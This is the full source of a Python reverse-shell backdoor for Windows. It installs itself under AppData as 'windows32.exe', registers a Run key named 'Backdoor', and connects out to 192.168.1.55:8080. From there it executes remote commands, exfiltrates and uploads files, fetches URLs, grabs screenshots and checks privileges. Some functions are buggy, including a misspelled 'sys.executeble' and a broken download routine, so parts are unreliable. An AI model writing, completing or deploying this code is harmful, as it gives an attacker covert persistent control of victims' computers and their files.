#!/usr/bin/python

import socket
import subprocess
import json
import os
import sys
import base64
import shutil
import platform
import time
import requests
#from mss import mss


def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue


def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot',
        'C:\\windows', 'temp')]))
    except:
        admin = "[-] User Privileges"
    else:
        admin = "[+] Admin Privileges"


def screenshot():
    with mss() as screenshot:
        screenshot.shot()


def persistence():
    if platform.system() == 'Windows':
        location  = os.environ["AppData"] + "\\windows32.exe"

        if not os.path.exists(location):
            shutil.copyfile(sys.executeble, location)
            path = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "'
            subprocess.call(path + location + '"', shell=True)


def download():
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write()


def shell():
    so = platform.system()
    reliable_send(so)
    while True:
        cmd = reliable_recv()
        if cmd == 'q':
            break
        elif cmd[:2] == "cd" and len(cmd) > 1:
            try:
                os.chdir(cmd[3:])
            except:
                continue
        elif cmd[:8] == "download":
            with open(cmd[9:], "rb") as up_file:
                reliable_send(base64.b64encode(up_file.read()))
        elif cmd[:6] == "upload":
            with open(cmd[7:], "wb") as down_file:
                file_data = reliable_recv()
                down_file.write(base64.b64decode(file_data))
        elif cmd[:3] == "get":
            try:
                download(cmd[4:])
                reliable_send("[+] Download File from specified URL!")
            except:
                reliable_send("[+] Failed to download that File")
        elif cmd[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                os.remove("monitor-1.png")
            except:
                reliable_send("[-] Failed to take Screenshot")
        elif cmd[:5] == "check":
            try:
                is_admin()
                reliable_send(admin)
            except:
                reliable_send("[-] Can not Perform the Check")
        elif cmd[:5] == "start":
            try:
                subprocess.Popen(cmd[6:], shell=True)
            except:
                reliable_send("[!] Strat Failed")
        else:
            proc = subprocess.Popen(cmd, shell=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)


def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(("192.168.1.55", 8080))
            shell()
        except:
            connection()


persistence()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
sock.close()
